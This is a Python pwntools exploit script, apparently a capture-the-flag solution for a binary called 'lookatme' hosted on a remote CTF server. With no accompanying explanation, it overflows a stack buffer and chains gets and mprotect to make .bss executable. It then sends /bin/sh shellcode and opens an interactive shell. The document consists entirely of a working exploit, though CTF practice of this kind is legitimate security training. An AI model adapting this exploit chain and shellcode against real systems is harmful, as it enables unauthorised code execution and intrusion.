#!/usr/bin/python 
from pwn import *

#p = process("./lookatme")
p = remote("ctf.j0n9hyun.xyz", 3017)
elf = ELF("./lookatme")
addr = 0x80ea000
size = 0x1000
prot = 0x7
gets_plt = elf.symbols['gets']
mprotect_plt = elf.symbols['mprotect']
p1ret = 0x80b8b9d
p3ret = 0x80b8b9b
bss = elf.bss()

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

pay = 'A'*(0x18 + 0x4)
pay += p32(gets_plt)
pay += p32(p1ret)
pay += p32(bss)
pay += p32(mprotect_plt)
pay += p32(p3ret)
pay += p32(addr)
pay += p32(size)
pay += p32(prot)
pay += p32(bss)

p.recv()
p.sendline(pay)
p.sendline(shellcode)

p.interactive()
